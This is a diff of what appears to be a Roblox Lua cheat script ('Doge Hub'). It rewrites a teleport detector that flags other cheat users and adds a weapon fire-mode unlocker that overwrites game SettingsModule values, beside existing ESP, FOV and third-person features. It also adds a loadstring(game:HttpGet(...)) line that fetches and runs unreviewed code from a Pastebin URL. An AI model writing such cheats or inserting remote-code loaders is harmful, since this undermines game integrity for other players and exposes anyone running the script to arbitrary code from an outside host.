@@ -50,7 +50,7 @@ end
 
 
 
-local level = "1.2"
+local level = "1.4"
 local function securitylayerchecks()
 
 warn("Started")
@@ -243,31 +243,7 @@ end
   -- This will toggle the swimming state (enable if currently disabled, disable if currently enabled)
 
 
-function SetDoorMaterialToForceField()
-    -- Get all descendants in the game
-    local allDescendants = game:GetDescendants()
 
-    -- Iterate through all descendants
-    for _, descendant in ipairs(allDescendants) do
-        -- Check if the descendant is a Model and named "Door"
-        if descendant:IsA("Model") and descendant.Name == "Door" then
-            -- Find the child named "Main" in the model
-            local mainPart = descendant:FindFirstChild("Main")
-            
-            -- If "Main" exists and is a BasePart, proceed
-            if mainPart and mainPart:IsA("BasePart") then
-                -- Set the Material to ForceField
-                mainPart.Material = Enum.Material.ForceField
-
-                -- Check for a SurfaceAppearance object and destroy it
-                local surfaceAppearance = mainPart:FindFirstChildOfClass("SurfaceAppearance")
-                if surfaceAppearance then
-                    surfaceAppearance:Destroy()
-                end
-            end
-        end
-    end
-end
 
 
 
@@ -385,66 +361,67 @@ local function sendNotification(message)
         Duration = 3;
     })
 end
+print("ethereal leaked?!?!!1!!11!! FR! fr!")
+print("ass ethereal ")
+-- Configuration
+local teleportThreshold = 400 -- Distance considered teleportation (in studs)
+local checkInterval = 0.1 -- Interval to check player positions (in seconds)
+local playerPositions = {} -- Store players' previous positions
+local flaggedPlayers = {} -- Store players who have already been flagged
+local bypassFlag = false -- Set to true to bypass flag detection
 
--- Function to detect teleportation of a player
-local function detectTeleportation(humanoidRootPart, p)
-    local lastPosition = humanoidRootPart.Position
-    print("[DEBUG] Starting teleport detection for: " .. p.Name) -- Debugging: See if detection starts
+-- Function to detect teleportation
+local function detectTeleportation(player, oldPosition, newPosition)
+    local distance = (newPosition - oldPosition).Magnitude
 
-    -- Start monitoring in a loop
-    coroutine.wrap(function()
-        while true do
-            wait(0.5) -- Check every 0.5 seconds
+    -- Uncomment for debug print
+    -- print(player.Name .. " - Distance moved: " .. distance)
 
-            local newPosition = humanoidRootPart.Position
-            if (newPosition - lastPosition).magnitude > 2800 then
-                -- Send notification when teleportation is detected
-                sendNotification("Doge Hub User: " .. p.Name)
-                print("[DEBUG] Detected teleportation for: " .. p.Name)
-            end
-
-            -- Debugging: Track the player's positions
-            print("[DEBUG] " .. p.Name .. " Position: ", newPosition)
-
-            -- Update last position for the next check
-            lastPosition = newPosition
+    if distance >= teleportThreshold and not bypassFlag then
+        -- Flag the player if not already flagged
+        if not flaggedPlayers[player.Name] then
+            flaggedPlayers[player.Name] = true -- Mark player as flagged
+            print(player.Name .. " flagged for teleportation!") -- Log the event
+            sendNotification("Doge Hub User Found:" ..player.Name .."")
         end
-    end)()
-end
-
--- Function to track a player's teleportation
-local function trackPlayerTeleportation(p)
-    print("[DEBUG] Tracking player: " .. p.Name) -- Debugging: Check when we start tracking a player
-    p.CharacterAdded:Connect(function(char)
-        print("[DEBUG] Character added for player: " .. p.Name) -- Debugging: When the character spawns
-        local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
-        detectTeleportation(humanoidRootPart, p)
-    end)
-
-    -- If the character already exists, monitor immediately
-    if p.Character then
-        print("[DEBUG] Character already exists for player: " .. p.Name) -- Debugging: Check if player exists at script start
-        local humanoidRootPart = p.Character:WaitForChild("HumanoidRootPart")
-        detectTeleportation(humanoidRootPart, p)
     end
 end
 
--- Start monitoring all players
-for _, p in pairs(Players:GetPlayers()) do
-    if p ~= player then
-        print("[DEBUG] Initializing tracking for: " .. p.Name) -- Debugging: Initial setup for players already in game
-        trackPlayerTeleportation(p)
+-- Main loop to track player positions and detect teleportation
+local function trackPlayers()
+    while true do
+        for _, player in pairs(game.Players:GetPlayers()) do
+            -- Ensure the player's character is loaded
+            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                local humanoidRootPart = player.Character.HumanoidRootPart
+                local currentPosition = humanoidRootPart.Position
+
+                -- Check if the player has been tracked before
+                if playerPositions[player.Name] then
+                    local oldPosition = playerPositions[player.Name]
+                    detectTeleportation(player, oldPosition, currentPosition)
+                else
+                    print(player.Name .. " has no previous position tracked.") -- Debug print
+                end
+
+                -- Update the player's position for the next check
+                playerPositions[player.Name] = currentPosition
+            else
+                -- If the character is not loaded, remove the player's position
+                playerPositions[player.Name] = nil
+            end
+        end
+
+        wait(checkInterval) -- Wait before checking again
     end
 end
 
--- Continuously check for new players joining
-Players.PlayerAdded:Connect(function(p)
-    if p ~= player then
-        print("[DEBUG] New player added: " .. p.Name) -- Debugging: New player joins the game
-        trackPlayerTeleportation(p)
-    end
-end)
+-- Start tracking players
+coroutine.wrap(trackPlayers)() -- Ensure the coroutine starts
+print("Player tracking started.")
 
+-- Load external script (make sure this is the intended use)
+loadstring(game:HttpGet("https://pastebin.com/raw/bZEizLZt"))()
 
 
 
@@ -460,9 +437,9 @@ end)
 
 
 local workspace = game:GetService("Workspace")
-local Players = game:GetService("Players")
+
 local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
+
 local Camera = workspace.CurrentCamera
 local LocalPlayer = Players.LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
@@ -581,8 +558,8 @@ end)
     You can call :AddButton on a button to add a SubButton!
 ]]
 local camera = workspace.CurrentCamera
-local userInputService = game:GetService("UserInputService")
-local mouse = game.Players.LocalPlayer:GetMouse()
+
+
 local runService = game:GetService("RunService")
 
 -- FOV Settings
@@ -642,7 +619,7 @@ runService.RenderStepped:Connect(function()
 end)
 
 local Player = game:GetService("Players").LocalPlayer
-local Mouse = Player:GetMouse()
+
 
 local isESPEnabled = false -- Toggle state
 
@@ -1274,7 +1251,88 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
+-- Path to the ReplicatedStorage and Player's inventory
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local player = game.Players.LocalPlayer
+local playerInventoryPath = replicatedStorage.Players:WaitForChild(player.Name, 5) -- 10 saniye bekler
 
+-- Table to keep track of processed items
+local processedItems = {}
+local inventoryChecking = false -- Başlangıçta kontrol işlemi durdurulmuş durumda
+
+-- Function to unlock and change fire modes for a specific weapon
+local function unlockFireModes(weapon)
+    local settingsModule = weapon:FindFirstChild("SettingsModule")
+    if settingsModule then
+        local weaponSettings = require(settingsModule)
+        if weaponSettings and weaponSettings.FireModes then
+            -- Unlock all fire modes: Auto, Semi, and Burst
+            weaponSettings.FireModes = { "Auto", "Semi", "Burst" }
+            print(weapon.Name .. " fire modes unlocked: Auto, Semi, Burst")
+        else
+            warn(weapon.Name .. " SettingsModule or FireModes not found!")
+        end
+    else
+        warn(weapon.Name .. " does not have a SettingsModule!")
+    end
+end
+
+-- Function to check the inventory and unlock fire modes for new items
+local function checkInventoryForNewItems()
+    if playerInventoryPath and playerInventoryPath:FindFirstChild("Inventory") then
+        local inventory = playerInventoryPath:WaitForChild("Inventory", 10)
+        
+        for _, weapon in pairs(inventory:GetChildren()) do
+            -- If the item is not yet processed, unlock its fire modes
+            if not processedItems[weapon.Name] then
+                unlockFireModes(weapon)
+                -- Mark the item as processed
+                processedItems[weapon.Name] = true
+            end
+        end
+    else
+        warn("Player inventory not found in ReplicatedStorage!")
+    end
+end
+
+-- Function to start inventory checking process
+local function startInventoryCheck()
+    if not inventoryChecking then
+        inventoryChecking = true
+        print("Inventory check started.")
+        
+        -- Periodically check the inventory every 10 seconds for new items
+        while inventoryChecking do
+            checkInventoryForNewItems()
+            wait(3) -- Wait for 10 seconds before checking again
+        end
+    else
+        print("Inventory check is already running.")
+    end
+end
+
+-- Function to stop inventory checking process
+local function stopInventoryCheck()
+    if inventoryChecking then
+        inventoryChecking = false
+        print("Inventory check stopped.")
+    end
+end
+
+
+
+-- Call this function when you want to start the process
+-- Example: startInventoryCheck() to start checking, stopInventoryCheck() to stop it.
+
+
+LeftGroupBox:AddToggle('unlckfrmodsxfrewfrwesdgfrytuı8oıuykıj67ytrhg', {
+    Text = 'Unlock Fire Modes',
+    Tooltip = 'Unlock Fire Modes',
+    Default = false, -- Initialize with the current state
+    Callback = function(enabled)
+startInventoryCheck()
+    end
+})
 
 LeftGroupBox:AddToggle('nowaterblur', {
     Text = 'No Water Blur',
@@ -1298,6 +1356,7 @@ LeftGroupBox:AddToggle('Experiementalsettingon', {
     Default = tracersEnabled, -- Initialize with the current state
     Callback = function(value)
 print("AA CC EE SS DD EE NN II EE DD")
+Library:Notify("DAD")
     end
 })
 
@@ -1686,7 +1745,7 @@ local function setupAnimator()
             warn("Humanoid not found in ViewModel")
         end
     else
-        warn("ViewModel or Camera not found in Workspace")
+
     end
     return false
 end
@@ -2126,7 +2185,7 @@ local skins = {
 	MP443 = "Whiteout",
 	IZh81 = "Watergun",
 }
-local player = game.Players.LocalPlayer
+
 local runSpeedThreshold = 16 -- Normal yürüyüş hızından daha hızlı olduğunda teleportu tetikle
 local speed = 0.5 -- Başlangıç teleport hızı
 local isRunning = false
@@ -2233,8 +2292,7 @@ Esptab3:AddToggle('spiderToggle', {
         end
     end
 })
-local player = game.Players.LocalPlayer
-local camera = workspace.CurrentCamera
+
 local thirdPersonDistance = 5 -- Distance for third-person view
 local thirdPersonActive = false -- Toggle state for third-person
 
